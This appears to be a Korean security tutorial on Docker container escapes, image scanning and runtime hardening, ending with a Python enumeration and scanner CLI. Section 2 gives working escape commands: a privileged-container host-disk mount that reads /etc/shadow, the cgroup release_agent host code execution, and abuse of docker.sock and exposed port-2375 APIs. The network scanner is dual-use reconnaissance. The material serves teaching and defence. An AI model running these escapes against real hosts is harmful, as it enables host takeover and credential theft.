> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Docker 보안: 컨테이너 탈출 및 취약점 분석

## 0. 초보자를 위한 개념 이해

### Docker 보안이란?

Docker는 애플리케이션을 "컨테이너"라는 격리된 환경에서 실행하는 기술이다. 가상 머신(VM)과 달리 OS 커널을 호스트와 공유하기 때문에 훨씬 가볍지만, 이 공유 구조가 보안상 위험을 만든다. Docker 보안은 컨테이너가 호스트 시스템에 미치는 영향을 최소화하고, 잘못된 설정으로 인한 탈출(Container Escape)을 방지하는 것이다.

**왜 배우는가:**
```
Docker 보안이 중요한 이유

VM vs 컨테이너 격리 차이:

  VM:
    [앱] → [게스트 OS] → [하이퍼바이저] → [호스트 OS]
    완전한 커널 격리 → 탈출 매우 어려움

  Docker:
    [앱] → [컨테이너] → [공유 커널] → [호스트 OS]
    커널 공유 → 잘못된 설정 시 호스트 노출

주요 위험:
  --privileged 플래그    → 호스트 전체 접근 가능
  도커 소켓 마운트       → 컨테이너에서 Docker 데몬 제어
  민감 디렉토리 마운트   → 호스트 파일시스템 접근
```

### 핵심 개념 정리

```
Docker 보안 메커니즘

메커니즘          역할                        기본값
──────────────────────────────────────────────────────
Namespaces       프로세스/네트워크/파일시스템 격리  활성
cgroups          CPU/메모리 리소스 제한            활성
Capabilities     루트 권한 세분화                  일부 허용
Seccomp          시스템 콜 필터링                  기본 프로파일
AppArmor/SELinux 강제 접근 제어                   배포판 의존
```

### 필요한 도구 및 환경
- **Docker Desktop / Docker Engine**: `apt install docker.io`
- **Trivy**: 컨테이너 이미지 취약점 스캔 (`apt install trivy`)
- **docker bench**: Docker 보안 설정 감사 도구

### 기초 실습 예제
```bash
# 1. 컨테이너 보안 설정 확인
docker inspect <container_id> | python3 -c "
import json, sys
data = json.load(sys.stdin)[0]
hc = data.get('HostConfig', {})
print('Privileged:', hc.get('Privileged', False))
print('PidMode:', hc.get('PidMode', ''))
print('NetworkMode:', hc.get('NetworkMode', ''))
print('Binds:', hc.get('Binds', []))
"

# 2. 도커 소켓 마운트 여부 확인 (위험!)
docker ps --format "{{.Names}}" | xargs -I {} \
    docker inspect {} --format '{{.Name}}: {{.Mounts}}' | \
    grep "docker.sock"

# 3. Trivy로 이미지 취약점 스캔
trivy image nginx:latest          # 공식 이미지도 취약점 있음
trivy image --severity HIGH,CRITICAL ubuntu:20.04

# 4. 최소 권한 컨테이너 실행
docker run --rm \
    --cap-drop=ALL \              # 모든 capability 제거
    --security-opt=no-new-privileges \  # 권한 상승 방지
    --read-only \                 # 루트 파일시스템 읽기 전용
    --tmpfs /tmp \                # 임시 쓰기 공간만 허용
    nginx:alpine
```

---

## 1. Docker 보안 개요

Docker 컨테이너는 완전한 격리를 제공하지 않는다. 커널을 호스트와 공유하기 때문에
잘못된 설정이나 취약점이 있으면 호스트 시스템 전체가 위험에 노출된다.

### 핵심 공격 표면

```
호스트 커널
├── cgroup / namespace 격리
├── seccomp 프로파일
├── capabilities
└── AppArmor / SELinux

Docker 데몬
├── /var/run/docker.sock (Unix socket)
├── TCP 2375 (비암호화) / 2376 (TLS)
└── REST API

컨테이너 이미지
├── 알려진 CVE 포함 베이스 이미지
├── 하드코딩된 시크릿
└── SUID 바이너리
```

---

## 2. 컨테이너 탈출 기법

### 2.1 Privileged Container 탈출

`--privileged` 플래그는 컨테이너에 거의 모든 Linux 캐퍼빌리티를 부여하고
디바이스 접근을 허용한다.

```bash
# 취약한 컨테이너 실행 (공격자가 이미 컨테이너 내부에 있다고 가정)
docker run --privileged -it ubuntu /bin/bash

# 컨테이너 내부에서 호스트 디스크 마운트
fdisk -l                          # 호스트 디바이스 목록 확인
mkdir /mnt/host
mount /dev/sda1 /mnt/host         # 호스트 루트 파티션 마운트
chroot /mnt/host                  # 호스트 환경으로 chroot
cat /etc/shadow                   # 호스트 패스워드 해시 탈취
```

```bash
# cgroup release_agent를 통한 코드 실행 (privileged 환경)
# 1. cgroup 마운트
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. notify_on_release 활성화
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. 호스트의 release_agent 경로 설정
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 4. 실행할 페이로드 작성
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd

# 5. cgroup에서 프로세스 종료 트리거
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output  # 호스트에서 실행된 id 명령의 결과
```

### 2.2 Docker Socket 마운트 탈출

```bash
# 컨테이너 내부에서 docker.sock이 마운트된 경우
ls -la /var/run/docker.sock

# 소켓을 통해 새로운 privileged 컨테이너 생성
docker -H unix:///var/run/docker.sock run \
  --privileged \
  --pid=host \
  --net=host \
  --volume /:/host \
  -it ubuntu chroot /host

# 호스트 파일시스템 전체 접근 완료
```

```bash
# curl로 Docker API 직접 호출 (소켓 사용)
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
```

### 2.3 Docker 데몬 TCP API 노출 공격

```bash
# 원격에서 노출된 Docker API 열거
curl http://TARGET:2375/version
curl http://TARGET:2375/containers/json
curl http://TARGET:2375/images/json

# 원격 Docker 데몬으로 컨테이너 실행
docker -H tcp://TARGET:2375 ps
docker -H tcp://TARGET:2375 run --privileged -v /:/host -it ubuntu chroot /host

# Shodan 쿼리 예시
# port:2375 product:Docker
# port:2376 ssl:Docker
```

### 2.4 Capabilities 악용

```bash
# 컨테이너에 부여된 캐퍼빌리티 확인
capsh --print
cat /proc/self/status | grep Cap
capsh --decode=<hex_value>

# CAP_SYS_ADMIN 있을 때 탈출
# - 마운트 작업 가능
# - cgroup 조작 가능
# - ptrace 사용 가능

# CAP_NET_ADMIN 있을 때
# - iptables 규칙 수정
# - 네트워크 인터페이스 조작

# CAP_SYS_PTRACE 있을 때
# - 호스트 프로세스에 ptrace 연결
# - 메모리 읽기/쓰기
gdb -p <host_pid>
# gdb> set (int)(*((int*)0x...)) = 0x...
```

---

## 3. 이미지 취약점 스캔

### 3.1 Trivy 사용법

```bash
# 설치
brew install trivy
# 또는
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh

# 이미지 스캔
trivy image ubuntu:20.04
trivy image --severity HIGH,CRITICAL nginx:latest

# 파일시스템 스캔
trivy fs /path/to/project

# Dockerfile 설정 감사 (misconfig)
trivy config ./Dockerfile

# JSON 출력
trivy image --format json --output results.json alpine:3.15

# SBOM 생성
trivy image --format cyclonedx --output sbom.json python:3.10

# 무시 정책 설정
trivy image --ignorefile .trivyignore ubuntu:20.04
```

### 3.2 Grype 사용법

```bash
# 설치
brew install anchore/grype/grype
# 또는
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh

# 이미지 스캔
grype ubuntu:20.04
grype docker:nginx:latest
grype --only-fixed debian:11

# 로컬 tarball 스캔
docker save myimage | grype

# SBOM 파일 스캔
grype sbom:./sbom.json

# CI/CD 연동 - 특정 심각도 이상 발견 시 exit 1
grype ubuntu:20.04 --fail-on high
```

### 3.3 Dockerfile 보안 감사

```bash
# Hadolint - Dockerfile 린터
docker run --rm -i hadolint/hadolint < Dockerfile
hadolint Dockerfile

# Dockle - 이미지 best practice 검사
dockle nginx:latest
dockle --exit-code 1 --exit-level warn myimage:latest

# Checkov - IaC 보안 스캔
checkov -d . --framework dockerfile
```

```dockerfile
# 취약한 Dockerfile 패턴 예시 (금지 사항)
FROM ubuntu:latest          # ❌ latest 태그 사용
USER root                   # ❌ root 실행
COPY . /app                 # ❌ 전체 디렉토리 복사 (시크릿 포함 가능)
RUN pip install requests    # ❌ 버전 고정 없음
ENV DB_PASSWORD=secretpass  # ❌ 시크릿 하드코딩

# 보안 강화 Dockerfile 패턴
FROM python:3.11-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY src/ ./src/

FROM python:3.11-slim
RUN useradd -r -s /bin/false appuser
COPY --from=builder /app /app
USER appuser
EXPOSE 8080
ENTRYPOINT ["python", "-m", "src.main"]
```

---

## 4. 런타임 보안 강화

```bash
# Seccomp 프로파일 적용
docker run --security-opt seccomp=/path/to/seccomp.json nginx

# AppArmor 프로파일 적용
docker run --security-opt apparmor=docker-default nginx

# 읽기 전용 루트 파일시스템
docker run --read-only nginx

# 캐퍼빌리티 최소화
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx

# 네임스페이스 격리 강화
docker run --userns-remap=default nginx

# no-new-privileges 설정
docker run --security-opt no-new-privileges nginx
```

---

## 5. Python CLI 도구: Docker 보안 열거기 및 취약점 스캐너

```python
#!/usr/bin/env python3
"""
docker_security_scanner.py - Docker 환경 보안 열거 및 취약점 탐지 CLI

사용법:
  python docker_security_scanner.py enum --host localhost --port 2375
  python docker_security_scanner.py scan-containers --host localhost
  python docker_security_scanner.py check-escape
  python docker_security_scanner.py audit-image --image nginx:latest
  python docker_security_scanner.py find-exposed --network 192.168.1.0/24
"""

import argparse
import json
import os
import socket
import subprocess
import sys
import ipaddress
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any
import urllib.request
import urllib.error


# ── 데이터 클래스 ────────────────────────────────────────────────────────────

@dataclass
class ContainerInfo:
    id: str
    name: str
    image: str
    status: str
    privileged: bool = False
    cap_add: list[str] = field(default_factory=list)
    volumes: list[str] = field(default_factory=list)
    network_mode: str = "bridge"
    pid_mode: str = ""
    security_opts: list[str] = field(default_factory=list)
    risks: list[str] = field(default_factory=list)


@dataclass
class DockerHostInfo:
    host: str
    port: int
    reachable: bool
    version: str = ""
    api_version: str = ""
    containers: list[ContainerInfo] = field(default_factory=list)
    images: list[dict] = field(default_factory=list)
    volumes: list[dict] = field(default_factory=list)


@dataclass
class EscapeVector:
    name: str
    severity: str
    detected: bool
    description: str
    evidence: str = ""


# ── Docker API 클라이언트 ─────────────────────────────────────────────────────

class DockerAPIClient:
    """HTTP/Unix-socket 기반 Docker API 클라이언트"""

    def __init__(self, host: str = "", port: int = 2375,
                 use_socket: bool = False, socket_path: str = "/var/run/docker.sock"):
        self.host = host
        self.port = port
        self.use_socket = use_socket
        self.socket_path = socket_path
        self.timeout = 10

    def _request(self, method: str, path: str, body: dict | None = None) -> dict | list | None:
        """Docker API 요청 수행"""
        try:
            if self.use_socket:
                return self._socket_request(method, path, body)
            else:
                return self._tcp_request(method, path, body)
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            raise ConnectionError(f"Docker API 연결 실패: {e}") from e

    def _tcp_request(self, method: str, path: str, body: dict | None = None) -> dict | list | None:
        conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        headers = {"Content-Type": "application/json"}
        data = json.dumps(body).encode() if body else None
        conn.request(method, path, body=data, headers=headers)
        resp = conn.getresponse()
        raw = resp.read().decode("utf-8")
        conn.close()
        if resp.status in (200, 201):
            return json.loads(raw) if raw else {}
        return None

    def _socket_request(self, method: str, path: str, body: dict | None = None) -> dict | list | None:
        """Unix 도메인 소켓 기반 요청"""
        import socket as _socket
        sock = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect(self.socket_path)
        data = json.dumps(body).encode() if body else b""
        request = (
            f"{method} {path} HTTP/1.0\r\n"
            f"Host: localhost\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(data)}\r\n"
            f"\r\n"
        ).encode() + data
        sock.sendall(request)
        response = b""
        while chunk := sock.recv(4096):
            response += chunk
        sock.close()
        headers, _, body_raw = response.partition(b"\r\n\r\n")
        status_line = headers.split(b"\r\n")[0]
        status_code = int(status_line.split()[1])
        if status_code in (200, 201) and body_raw:
            return json.loads(body_raw.decode())
        return None

    def get_version(self) -> dict:
        result = self._request("GET", "/version")
        return result or {}

    def list_containers(self, all_containers: bool = True) -> list[dict]:
        path = f"/containers/json?all={'true' if all_containers else 'false'}"
        result = self._request("GET", path)
        return result or []

    def inspect_container(self, container_id: str) -> dict:
        result = self._request("GET", f"/containers/{container_id}/json")
        return result or {}

    def list_images(self) -> list[dict]:
        result = self._request("GET", "/images/json")
        return result or []

    def list_volumes(self) -> dict:
        result = self._request("GET", "/volumes")
        return result or {}

    def get_info(self) -> dict:
        result = self._request("GET", "/info")
        return result or {}


# ── 취약점 분석 함수 ─────────────────────────────────────────────────────────

def analyze_container_risks(inspect_data: dict) -> tuple[ContainerInfo, list[str]]:
    """컨테이너 inspect 데이터로 위험 요소 분석"""
    config = inspect_data.get("Config", {})
    host_config = inspect_data.get("HostConfig", {})
    name = inspect_data.get("Name", "").lstrip("/")
    container_id = inspect_data.get("Id", "")[:12]

    risks: list[str] = []

    # Privileged 체크
    privileged = host_config.get("Privileged", False)
    if privileged:
        risks.append("CRITICAL: --privileged 플래그 활성화 (컨테이너 탈출 가능)")

    # 위험 캐퍼빌리티 체크
    dangerous_caps = {
        "SYS_ADMIN": "cgroup 조작, 마운트 작업 가능 → 탈출 위험",
        "SYS_PTRACE": "호스트 프로세스 ptrace 가능",
        "NET_ADMIN": "네트워크 설정 변경 가능",
        "SYS_MODULE": "커널 모듈 로드 가능",
        "DAC_OVERRIDE": "파일 권한 무시 가능",
        "SETUID": "UID 변경 가능",
        "SETGID": "GID 변경 가능",
    }
    cap_add = host_config.get("CapAdd") or []
    for cap in cap_add:
        cap_clean = cap.replace("CAP_", "")
        if cap_clean in dangerous_caps:
            risks.append(f"HIGH: CAP_{cap_clean} 부여됨 - {dangerous_caps[cap_clean]}")

    # Docker 소켓 마운트 체크
    binds = host_config.get("Binds") or []
    for bind in binds:
        if "docker.sock" in bind:
            risks.append("CRITICAL: Docker 소켓(/var/run/docker.sock) 마운트됨 → 호스트 완전 탈취 가능")
        if bind.startswith("/:/") or bind.startswith("/:/host"):
            risks.append("CRITICAL: 호스트 루트 파일시스템 마운트됨")
        if bind.startswith("/etc:"):
            risks.append("HIGH: /etc 디렉토리 마운트됨 (설정 파일 접근)")
        if bind.startswith("/proc:"):
            risks.append("HIGH: /proc 마운트됨")

    # PID 네임스페이스 공유
    pid_mode = host_config.get("PidMode", "")
    if pid_mode == "host":
        risks.append("HIGH: --pid=host 설정됨 (호스트 프로세스 가시성)")

    # 네트워크 모드
    network_mode = host_config.get("NetworkMode", "bridge")
    if network_mode == "host":
        risks.append("HIGH: --network=host 설정됨 (호스트 네트워크 공유)")

    # 사용자 체크
    user = config.get("User", "")
    if not user or user == "root" or user == "0":
        risks.append("MEDIUM: root 사용자로 실행 중")

    # Security Opts
    security_opts = host_config.get("SecurityOpt") or []
    has_seccomp = any("seccomp" in opt for opt in security_opts)
    has_apparmor = any("apparmor" in opt for opt in security_opts)
    if not has_seccomp:
        risks.append("LOW: Seccomp 프로파일 미적용")
    if not has_apparmor:
        risks.append("LOW: AppArmor 프로파일 미적용")

    container = ContainerInfo(
        id=container_id,
        name=name,
        image=config.get("Image", ""),
        status=inspect_data.get("State", {}).get("Status", ""),
        privileged=privileged,
        cap_add=cap_add,
        volumes=binds,
        network_mode=network_mode,
        pid_mode=pid_mode,
        security_opts=security_opts,
        risks=risks,
    )
    return container, risks


def check_container_escape_vectors() -> list[EscapeVector]:
    """현재 컨테이너 환경에서 탈출 벡터 자동 탐지"""
    vectors: list[EscapeVector] = []

    # 1. Privileged 체크
    try:
        with open("/proc/self/status") as f:
            status = f.read()
        cap_prm_line = [l for l in status.splitlines() if l.startswith("CapPrm:")]
        if cap_prm_line:
            cap_hex = cap_prm_line[0].split()[1]
            cap_val = int(cap_hex, 16)
            is_privileged = cap_val == 0x3fffffffff
            vectors.append(EscapeVector(
                name="Privileged Container",
                severity="CRITICAL",
                detected=is_privileged,
                description="컨테이너가 --privileged 모드로 실행됨",
                evidence=f"CapPrm: {cap_hex} ({'FULL' if is_privileged else 'LIMITED'})"
            ))
    except OSError:
        pass

    # 2. Docker 소켓 접근
    docker_sock = Path("/var/run/docker.sock")
    vectors.append(EscapeVector(
        name="Docker Socket",
        severity="CRITICAL",
        detected=docker_sock.exists(),
        description="Docker 소켓이 컨테이너 내부에 마운트됨",
        evidence=str(docker_sock) if docker_sock.exists() else "없음"
    ))

    # 3. CAP_SYS_ADMIN
    try:
        with open("/proc/self/status") as f:
            status = f.read()
        cap_eff_line = [l for l in status.splitlines() if l.startswith("CapEff:")]
        if cap_eff_line:
            cap_hex = cap_eff_line[0].split()[1]
            cap_val = int(cap_hex, 16)
            has_sys_admin = bool(cap_val & (1 << 21))
            vectors.append(EscapeVector(
                name="CAP_SYS_ADMIN",
                severity="HIGH",
                detected=has_sys_admin,
                description="CAP_SYS_ADMIN 캐퍼빌리티 보유 (cgroup notify_on_release 탈출 가능)",
                evidence=f"CapEff: {cap_hex}"
            ))
    except OSError:
        pass

    # 4. 쓰기 가능한 /proc/sysrq-trigger
    sysrq = Path("/proc/sysrq-trigger")
    try:
        writable = os.access(str(sysrq), os.W_OK)
        vectors.append(EscapeVector(
            name="Writable /proc/sysrq-trigger",
            severity="MEDIUM",
            detected=writable,
            description="/proc/sysrq-trigger에 쓰기 권한 있음",
            evidence=str(sysrq) if writable else "없음"
        ))
    except OSError:
        pass

    # 5. 호스트 디바이스 접근
    dev_sda = Path("/dev/sda")
    vectors.append(EscapeVector(
        name="Host Block Device Access",
        severity="CRITICAL",
        detected=dev_sda.exists(),
        description="호스트 블록 디바이스(/dev/sda)에 접근 가능",
        evidence=str(dev_sda) if dev_sda.exists() else "없음"
    ))

    # 6. 네임스페이스 확인 (호스트와 동일한지)
    try:
        container_mnt_ns = os.readlink("/proc/self/ns/mnt")
        host_init_mnt_ns = os.readlink("/proc/1/ns/mnt")
        same_ns = container_mnt_ns == host_init_mnt_ns
        vectors.append(EscapeVector(
            name="Shared Mount Namespace",
            severity="HIGH",
            detected=same_ns,
            description="컨테이너가 호스트와 마운트 네임스페이스를 공유함",
            evidence=f"self: {container_mnt_ns}, init: {host_init_mnt_ns}"
        ))
    except OSError:
        pass

    # 7. cgroup v1 release_agent 쓰기 가능
    cgroup_path = Path("/sys/fs/cgroup")
    cgroup_writable = False
    if cgroup_path.exists():
        for item in cgroup_path.rglob("release_agent"):
            if os.access(str(item), os.W_OK):
                cgroup_writable = True
                break
    vectors.append(EscapeVector(
        name="Writable cgroup release_agent",
        severity="CRITICAL",
        detected=cgroup_writable,
        description="cgroupv1 release_agent에 쓰기 가능 → 호스트 코드 실행 가능",
        evidence="/sys/fs/cgroup/*/release_agent" if cgroup_writable else "없음"
    ))

    return vectors


def scan_network_for_docker(network_cidr: str, port: int = 2375,
                             max_workers: int = 50) -> list[str]:
    """네트워크 범위에서 노출된 Docker API 검색"""
    exposed: list[str] = []
    network = ipaddress.ip_network(network_cidr, strict=False)
    hosts = list(network.hosts())

    def check_host(ip: str) -> str | None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                client = DockerAPIClient(host=ip, port=port)
                ver = client.get_version()
                if ver:
                    return ip
        except (OSError, ConnectionError):
            pass
        return None

    print(f"[*] {network_cidr} 범위에서 Docker API(:{port}) 검색 중 ({len(hosts)} hosts)...")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_host, str(ip)): str(ip) for ip in hosts}
        for future in as_completed(futures):
            result = future.result()
            if result:
                exposed.append(result)
                print(f"[!] 노출된 Docker API 발견: {result}:{port}")

    return exposed


# ── CLI 커맨드 핸들러 ─────────────────────────────────────────────────────────

def cmd_enum(args: argparse.Namespace) -> None:
    """Docker 호스트 열거"""
    use_socket = args.socket
    if use_socket:
        print(f"[*] Docker 소켓 연결: {args.socket_path}")
        client = DockerAPIClient(use_socket=True, socket_path=args.socket_path)
    else:
        print(f"[*] Docker API 연결: {args.host}:{args.port}")
        client = DockerAPIClient(host=args.host, port=args.port)

    try:
        version = client.get_version()
    except ConnectionError as e:
        print(f"[-] {e}")
        sys.exit(1)

    if not version:
        print("[-] Docker API 응답 없음")
        sys.exit(1)

    print("\n[Docker 버전 정보]")
    print(f"  Engine Version : {version.get('Version', 'N/A')}")
    print(f"  API Version    : {version.get('ApiVersion', 'N/A')}")
    print(f"  OS             : {version.get('Os', 'N/A')}")
    print(f"  Arch           : {version.get('Arch', 'N/A')}")
    print(f"  Kernel         : {version.get('KernelVersion', 'N/A')}")

    info = client.get_info()
    if info:
        print(f"\n[Docker 시스템 정보]")
        print(f"  컨테이너 수    : {info.get('Containers', 0)}")
        print(f"  이미지 수      : {info.get('Images', 0)}")
        print(f"  루트 디렉토리  : {info.get('DockerRootDir', 'N/A')}")
        print(f"  스토리지 드라이버: {info.get('Driver', 'N/A')}")
        print(f"  로깅 드라이버  : {info.get('LoggingDriver', 'N/A')}")
        security_options = info.get("SecurityOptions", [])
        print(f"  보안 옵션      : {', '.join(security_options) if security_options else '없음'}")

    containers = client.list_containers(all_containers=True)
    print(f"\n[컨테이너 목록] ({len(containers)}개)")
    for c in containers:
        cid = c.get("Id", "")[:12]
        names = ", ".join(c.get("Names", []))
        image = c.get("Image", "N/A")
        status = c.get("State", "N/A")
        ports = c.get("Ports", [])
        port_str = ", ".join(f"{p.get('IP','')}{p.get('PublicPort','')}:{p.get('PrivatePort','')}"
                              for p in ports if p.get("PublicPort")) or "없음"
        print(f"  [{cid}] {names:30s} {image:30s} {status:10s} 포트:{port_str}")

    images = client.list_images()
    print(f"\n[이미지 목록] ({len(images)}개)")
    for img in images[:20]:
        tags = ", ".join(img.get("RepoTags") or ["<none>"])
        size_mb = img.get("Size", 0) // (1024 * 1024)
        created = img.get("Created", 0)
        print(f"  {tags:50s} {size_mb}MB")


def cmd_scan_containers(args: argparse.Namespace) -> None:
    """모든 컨테이너 보안 취약점 스캔"""
    use_socket = args.socket
    if use_socket:
        client = DockerAPIClient(use_socket=True, socket_path=args.socket_path)
    else:
        client = DockerAPIClient(host=args.host, port=args.port)

    try:
        containers = client.list_containers(all_containers=True)
    except ConnectionError as e:
        print(f"[-] {e}")
        sys.exit(1)

    print(f"[*] {len(containers)}개 컨테이너 보안 분석 시작\n")

    results: list[ContainerInfo] = []

    def analyze_one(c: dict) -> ContainerInfo:
        cid = c.get("Id", "")
        try:
            inspect = client.inspect_container(cid)
            container, _ = analyze_container_risks(inspect)
            return container
        except (ConnectionError, KeyError):
            return ContainerInfo(
                id=cid[:12], name="error", image="", status="error"
            )

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(analyze_one, c) for c in containers]
        for future in as_completed(futures):
            results.append(future.result())

    # 위험도 순 정렬
    results.sort(key=lambda x: len(x.risks), reverse=True)

    critical_count = 0
    high_count = 0

    for container in results:
        if not container.risks:
            continue
        print(f"{'='*60}")
        print(f"컨테이너: {container.name} [{container.id}]")
        print(f"이미지: {container.image}")
        print(f"상태: {container.status}")
        print(f"발견된 위험 ({len(container.risks)}개):")
        for risk in container.risks:
            print(f"  ⚠  {risk}")
            if "CRITICAL" in risk:
                critical_count += 1
            elif "HIGH" in risk:
                high_count += 1
        print()

    print(f"\n[요약]")
    print(f"  분석된 컨테이너 : {len(results)}개")
    print(f"  취약 컨테이너   : {sum(1 for r in results if r.risks)}개")
    print(f"  CRITICAL 위험   : {critical_count}개")
    print(f"  HIGH 위험       : {high_count}개")

    if args.output:
        output_data = [asdict(r) for r in results]
        Path(args.output).write_text(json.dumps(output_data, indent=2, ensure_ascii=False))
        print(f"\n[+] 결과 저장: {args.output}")


def cmd_check_escape(args: argparse.Namespace) -> None:
    """현재 컨테이너에서 탈출 벡터 자동 탐지"""
    print("[*] 컨테이너 탈출 벡터 탐지 시작...\n")

    vectors = check_container_escape_vectors()

    detected = [v for v in vectors if v.detected]
    not_detected = [v for v in vectors if not v.detected]

    if detected:
        print(f"[!] 탈출 벡터 발견 ({len(detected)}개):\n")
        for v in detected:
            print(f"  [{v.severity}] {v.name}")
            print(f"    설명: {v.description}")
            print(f"    증거: {v.evidence}")
            print()
    else:
        print("[+] 탈출 벡터 미발견\n")

    if not args.only_vulnerable:
        print(f"[정상 항목] ({len(not_detected)}개):")
        for v in not_detected:
            print(f"  [OK] {v.name}")

    print(f"\n[요약] 총 {len(vectors)}개 항목 검사 | 취약: {len(detected)}개")


def cmd_find_exposed(args: argparse.Namespace) -> None:
    """네트워크에서 노출된 Docker API 탐색"""
    exposed = scan_network_for_docker(
        args.network, port=args.port, max_workers=args.workers
    )
    print(f"\n[결과] 노출된 Docker API: {len(exposed)}개")
    for host in exposed:
        print(f"  tcp://{host}:{args.port}")

    if args.output:
        Path(args.output).write_text(json.dumps(exposed, indent=2))
        print(f"[+] 결과 저장: {args.output}")


def cmd_audit_image(args: argparse.Namespace) -> None:
    """이미지 취약점 스캔 (trivy/grype 래퍼)"""
    image = args.image
    scanner = args.scanner
    print(f"[*] {image} 이미지 스캔 시작 (스캐너: {scanner})\n")

    if scanner == "trivy":
        cmd = ["trivy", "image", "--format", "json", image]
        if args.severity:
            cmd += ["--severity", args.severity]
    elif scanner == "grype":
        cmd = ["grype", image, "--output", "json"]
    else:
        print(f"[-] 알 수 없는 스캐너: {scanner}")
        sys.exit(1)

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        if result.returncode != 0 and not result.stdout:
            print(f"[-] 스캔 실패: {result.stderr}")
            sys.exit(1)
        data = json.loads(result.stdout)
    except FileNotFoundError:
        print(f"[-] {scanner} 미설치. 설치 후 재시도:")
        if scanner == "trivy":
            print("    brew install trivy")
            print("    또는: curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print("[-] 스캔 타임아웃")
        sys.exit(1)

    # 결과 파싱 및 출력
    if scanner == "trivy":
        results = data.get("Results", [])
        total_vulns = 0
        critical = high = medium = low = 0
        for res in results:
            vulns = res.get("Vulnerabilities") or []
            for v in vulns:
                total_vulns += 1
                sev = v.get("Severity", "").upper()
                if sev == "CRITICAL":
                    critical += 1
                elif sev == "HIGH":
                    high += 1
                elif sev == "MEDIUM":
                    medium += 1
                else:
                    low += 1

                if sev in ("CRITICAL", "HIGH"):
                    print(f"  [{sev}] {v.get('VulnerabilityID')} - {v.get('PkgName')} "
                          f"{v.get('InstalledVersion')} → {v.get('FixedVersion', 'fix없음')}")
                    print(f"    {v.get('Title', '')[:80]}")

        print(f"\n[요약] 총 취약점: {total_vulns} | CRITICAL:{critical} HIGH:{high} MEDIUM:{medium} LOW:{low}")

    if args.output:
        Path(args.output).write_text(json.dumps(data, indent=2, ensure_ascii=False))
        print(f"[+] 전체 결과 저장: {args.output}")


# ── argparse 설정 ─────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="docker_security_scanner",
        description="Docker 환경 보안 열거 및 취약점 탐지 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s enum --host 192.168.1.100 --port 2375
  %(prog)s enum --socket
  %(prog)s scan-containers --host 192.168.1.100
  %(prog)s check-escape --only-vulnerable
  %(prog)s find-exposed --network 192.168.1.0/24
  %(prog)s audit-image --image ubuntu:20.04 --scanner trivy --severity HIGH,CRITICAL
        """
    )

    # 공통 인자
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--host", default="localhost", help="Docker 호스트 (기본: localhost)")
    common.add_argument("--port", type=int, default=2375, help="Docker API 포트 (기본: 2375)")
    common.add_argument("--socket", action="store_true", help="Unix 소켓 사용")
    common.add_argument("--socket-path", default="/var/run/docker.sock", help="소켓 경로")
    common.add_argument("--output", "-o", help="결과 저장 파일 (JSON)")

    sub = parser.add_subparsers(dest="command", required=True)

    # enum
    p_enum = sub.add_parser("enum", parents=[common], help="Docker 호스트 정보 열거")

    # scan-containers
    p_scan = sub.add_parser("scan-containers", parents=[common], help="컨테이너 보안 분석")

    # check-escape
    p_escape = sub.add_parser("check-escape", help="현재 컨테이너 탈출 벡터 탐지")
    p_escape.add_argument("--only-vulnerable", action="store_true", help="취약 항목만 출력")

    # find-exposed
    p_find = sub.add_parser("find-exposed", help="네트워크에서 노출된 Docker API 탐색")
    p_find.add_argument("--network", required=True, help="CIDR 범위 (예: 192.168.1.0/24)")
    p_find.add_argument("--port", type=int, default=2375, help="포트 (기본: 2375)")
    p_find.add_argument("--workers", type=int, default=50, help="병렬 스레드 수")
    p_find.add_argument("--output", "-o", help="결과 저장 파일")

    # audit-image
    p_audit = sub.add_parser("audit-image", help="이미지 취약점 스캔")
    p_audit.add_argument("--image", required=True, help="스캔할 이미지 (예: ubuntu:20.04)")
    p_audit.add_argument("--scanner", choices=["trivy", "grype"], default="trivy")
    p_audit.add_argument("--severity", default="HIGH,CRITICAL", help="심각도 필터")
    p_audit.add_argument("--output", "-o", help="결과 저장 파일")

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    dispatch = {
        "enum": cmd_enum,
        "scan-containers": cmd_scan_containers,
        "check-escape": cmd_check_escape,
        "find-exposed": cmd_find_exposed,
        "audit-image": cmd_audit_image,
    }

    handler = dispatch.get(args.command)
    if handler:
        handler(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

---

## 6. Docker Bench for Security

```bash
